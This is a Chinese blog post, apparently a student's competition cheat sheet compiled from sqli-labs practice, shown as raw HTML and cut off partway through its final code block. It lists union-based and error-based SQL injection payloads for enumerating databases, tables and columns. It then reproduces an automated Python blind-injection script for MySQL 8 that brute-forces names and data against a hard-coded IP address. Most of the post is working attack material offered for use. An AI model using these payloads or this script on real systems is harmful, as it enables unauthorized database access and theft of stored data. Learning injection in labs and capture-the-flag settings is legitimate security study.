<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>UPONのblog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="UPONのblog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="UPONのblog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="UPON-2021の屋子"><meta property="og:url" content="https://upon-2021.github.io/"><meta property="og:site_name" content="UPON-2021の屋子"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://upon-2021.github.io/img/avatar.png"><meta property="article:author" content="UPON-2021"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"xn--upon-eu0gs25bb4r113aow1c.googles.icu"},"headline":"UPONのblog","image":["/img/og_image.png"],"author":{"@type":"Person","name":"UPON2021"},"description":""}</script><link rel="icon" href="/img/favicon.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card widget">
            <div class="card-content">
                <h3 class="menu-label">热门推荐</h3><span id="index_hot_div">加载中，请稍等...</span>
            </div>
        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-15  <a class="commentCountImg" href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/#comment-container"><span class="display-none-class">ac4653b9cb3724e131542849f033e1f4</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="ac4653b9cb3724e131542849f033e1f4">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>22 分钟  <i class="fas fa-pencil-alt"> </i>3.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/">SQL注入备忘录</a></h1><div class="content"><p>最近在用<code>sql-lib</code>学sql注入，零零散散的笔记整了一大堆，现在整合一下，做个备忘录，方便比赛的时候方便查询。</p>
<h1 id="典中典版本"><a href="#典中典版本" class="headerlink" title="典中典版本:"></a>典中典版本:</h1><p><code>爆库版本</code>: <code>?id=-1&#39; union select 1,database(),3--+</code><br><code>爆库</code>: <code>?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code><br><code>爆表</code>: <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;数据库&#39;#</code><br><code>爆字段</code>: <code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;数据表&#39;#</code><br>这几个出来了，剩下的就不用我说了吧qwq</p>
<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h1><table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>system_user()</td>
<td>系统用户名</td>
</tr>
<tr>
<td>user()</td>
<td>用户名</td>
</tr>
<tr>
<td>session_user()</td>
<td>连接数据库的用户名</td>
</tr>
<tr>
<td>database()</td>
<td>数据库名</td>
</tr>
<tr>
<td>version()</td>
<td>MYSQL数据库版本</td>
</tr>
<tr>
<td>load_file()</td>
<td>MYSQL读取本地文件的函数</td>
</tr>
<tr>
<td>@@datadir</td>
<td>读取数据库路径</td>
</tr>
<tr>
<td>@@basedir MYSQL</td>
<td>安装路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>操作系统</td>
</tr>
</tbody></table>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入:"></a>报错注入:</h1><h2 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h2><p>都会，不解释了。<br>公式:<code>extractvalue(数字,concat(0x7e,(查询语句),0x7e))</code></p>
<h2 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h2><p>都会，不解释了。<br>公式:<code>updatexml(数字,concat(0x7e,(查询语句),0x7e),数字)</code></p>
<h2 id="溢出报错"><a href="#溢出报错" class="headerlink" title="溢出报错"></a>溢出报错</h2><h3 id="exp函数溢出-mysql-gt-5-5-53"><a href="#exp函数溢出-mysql-gt-5-5-53" class="headerlink" title="exp函数溢出 | mysql&gt;5.5.53"></a>exp函数溢出 | mysql&gt;5.5.53</h3><p>原理:当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误,用 ~ 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from(select version())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;5.5.44-0ubuntu0.14.04.1&#x27; from dual)))&#x27;</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
<p>公式:<code>select exp(~(select * from(查询语句)x));</code><br>支持load_file,最多13行</p>
<h3 id="BIGINT溢出"><a href="#BIGINT溢出" class="headerlink" title="BIGINT溢出"></a>BIGINT溢出</h3><p>差不多同样的原理，可以报错<br>公式:<code>select 1+~(select*from(查询语句)x);</code><br>同理，其他的函数也可以这么干:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select !atan((select*from(查询语句)a))-~0;</span><br><span class="line">select !ceil((select*from(查询语句)a))-~0;</span><br><span class="line">select !floor((select*from(查询语句)a))-~0;</span><br></pre></td></tr></table></figure>

<p>其他能利用的函数…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HEX</span><br><span class="line">IN</span><br><span class="line">FLOOR</span><br><span class="line">CEIL</span><br><span class="line">RAND</span><br><span class="line">CEILING</span><br><span class="line">TRUNCATE</span><br><span class="line">TAN</span><br><span class="line">SQRT</span><br><span class="line">ROUND</span><br><span class="line">SIGN</span><br><span class="line">EXP</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="group-by-注入-表中的数据至少要为三条才可以注入成功"><a href="#group-by-注入-表中的数据至少要为三条才可以注入成功" class="headerlink" title="group by 注入 | 表中的数据至少要为三条才可以注入成功"></a>group by 注入 | 表中的数据至少要为三条才可以注入成功</h2><p>原理:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986">group_by注入</a></p>
<p>公式:<code>select count(*) from information_schema.tables group by concat((查询语句),floor(rand()*2));</code><br>效率比较低qwq而且还有猜错的可能</p>
<h1 id="无select注入-MySQL-8"><a href="#无select注入-MySQL-8" class="headerlink" title="无select注入 | MySQL 8"></a>无select注入 | MySQL 8</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231627">浅谈利用mysql8新特性进行SQL注入</a><br>脚本搬到这里了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@author qwzf</span></span><br><span class="line"><span class="string">@desc 本脚本是用于mysql 8新特性的sql注入</span></span><br><span class="line"><span class="string">@date 2021/02/18</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.41.231.75:8002/Less-8/?id=&#x27;</span></span><br><span class="line">chars=string.ascii_letters+string.digits+<span class="string">&quot;@&#123;&#125;_-?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">current_db</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;利用mysql8新特性或普通布尔盲注:\n1.新特性(联合查询) 2.普通布尔盲注&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入序号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        payload = <span class="string">&quot;-1&#x27; union values row(1,database(),3)--+&quot;</span>  <span class="comment">#联合查询爆当前数据库(可修改)</span></span><br><span class="line">        urls = url + payload</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and ascii(substr((database()),&#123;0&#125;,1))=&#123;1&#125;--+&quot;</span> <span class="comment">#布尔盲注爆当前数据库(可修改)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">            char=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += j</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    char = j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">name</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs</span>(<span class="params">url</span>): <span class="comment">#无列名盲注爆所有数据库(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据库，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#123;&#125;,&#x27;&#x27;,4,5,6)&gt;(table information_schema.schemata limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables_n</span>(<span class="params">url,database</span>): <span class="comment">#无列名盲注爆数据表开始行数(可修改)</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &#123;&#125;,1)--+&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">        payloads = payload.<span class="built_in">format</span>(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(database[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">            database = database[<span class="number">0</span>:-<span class="number">1</span>]+char</span><br><span class="line">            payld = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;从第&#x27;</span>,i,<span class="string">&#x27;行开始爆数据表&#x27;</span>)   <span class="comment">#判断开始行数</span></span><br><span class="line">                n = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables</span>(<span class="params">url,database,n</span>):  <span class="comment">#无列名盲注爆数据表(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据表，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x + n)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns_n</span>(<span class="params">url,database,table</span>): <span class="comment">#无列名盲注爆字段开始行数(可修改)</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &#123;&#125;,1)--+&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>,<span class="number">10000</span>):</span><br><span class="line">        payloads = payload.<span class="built_in">format</span>(i)</span><br><span class="line">        urls = url + payloads</span><br><span class="line">        r = requests.get(url=urls)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(table[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">            table = table[<span class="number">0</span>:-<span class="number">1</span>]+char</span><br><span class="line">            payld = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">            urls = url + payld</span><br><span class="line">            res = requests.get(url=urls)</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;从第&#x27;</span>,i,<span class="string">&#x27;行开始爆字段&#x27;</span>)   <span class="comment">#判断开始行数</span></span><br><span class="line">                n = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">columns</span>(<span class="params">url,database,table,n</span>):  <span class="comment">#无列名盲注爆字段值(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个字段，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x + n)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&quot;</span>+database+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+table+<span class="string">&quot;&#x27;,&#123;&#125;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">datas</span>(<span class="params">url,table</span>):  <span class="comment">#无列名盲注爆数据(可修改)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据，如：1,2等:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        y = x-<span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(y)</span><br><span class="line">        <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&quot;</span>+<span class="built_in">str</span>(x)+<span class="string">&quot;,&#123;&#125;,&#x27;&#x27;)&gt;(table &quot;</span>+table+<span class="string">&quot; limit &quot;</span>+num+<span class="string">&quot;,1)--+&quot;</span></span><br><span class="line">     